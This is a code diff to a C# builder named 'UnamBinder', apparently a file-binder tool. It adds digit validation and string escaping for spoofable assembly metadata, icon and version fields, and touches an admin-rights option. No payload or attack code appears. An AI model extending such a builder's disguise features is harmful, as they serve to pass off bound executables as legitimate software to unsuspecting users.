@@ -16,8 +16,6 @@ namespace UnamBinder
         public Vanity vanity = new Vanity();
         private string key = RandomString(32);
 
-        public static int MAX_PATH = 255;
-
         public Builder()
         {
             InitializeComponent();
@@ -73,11 +71,13 @@ namespace UnamBinder
 
                 if (buildResource)
                 {
+                    if (BuildErrorTest(!string.Join("", new string[] { vanity.txtAssemblyVersion1.Text, vanity.txtAssemblyVersion2.Text, vanity.txtAssemblyVersion3.Text, vanity.txtAssemblyVersion4.Text }).All(char.IsDigit), "Error: Assembly Version must only contain numbers.")) return;
+
                     StringBuilder resource = new StringBuilder(Properties.Resources.resource);
                     string defs = "";
                     if (vanity.checkIcon.Checked)
                     {
-                        resource.Replace("#ICON", vanity.txtIconPath.Text);
+                        resource.Replace("#ICON", ToLiteral(vanity.txtIconPath.Text));
                         defs += " -DDefIcon";
                     }
                     if (checkAdmin.Checked)
@@ -87,12 +87,12 @@ namespace UnamBinder
                     }
                     if (vanity.checkAssembly.Checked)
                     {
-                        resource.Replace("#TITLE", vanity.txtAssemblyTitle.Text);
-                        resource.Replace("#DESCRIPTION", vanity.txtAssemblyDescription.Text);
-                        resource.Replace("#COMPANY", vanity.txtAssemblyCompany.Text);
-                        resource.Replace("#PRODUCT", vanity.txtAssemblyProduct.Text);
-                        resource.Replace("#COPYRIGHT", vanity.txtAssemblyCopyright.Text);
-                        resource.Replace("#TRADEMARK", vanity.txtAssemblyTrademark.Text);
+                        resource.Replace("#TITLE", ToLiteral(vanity.txtAssemblyTitle.Text));
+                        resource.Replace("#DESCRIPTION", ToLiteral(vanity.txtAssemblyDescription.Text));
+                        resource.Replace("#COMPANY", ToLiteral(vanity.txtAssemblyCompany.Text));
+                        resource.Replace("#PRODUCT", ToLiteral(vanity.txtAssemblyProduct.Text));
+                        resource.Replace("#COPYRIGHT", ToLiteral(vanity.txtAssemblyCopyright.Text));
+                        resource.Replace("#TRADEMARK", ToLiteral(vanity.txtAssemblyTrademark.Text));
                         resource.Replace("#VERSION", string.Join(",", new string[] { vanity.txtAssemblyVersion1.Text, vanity.txtAssemblyVersion2.Text, vanity.txtAssemblyVersion3.Text, vanity.txtAssemblyVersion4.Text }));
                         defs += " -DDefAssembly";
                     }
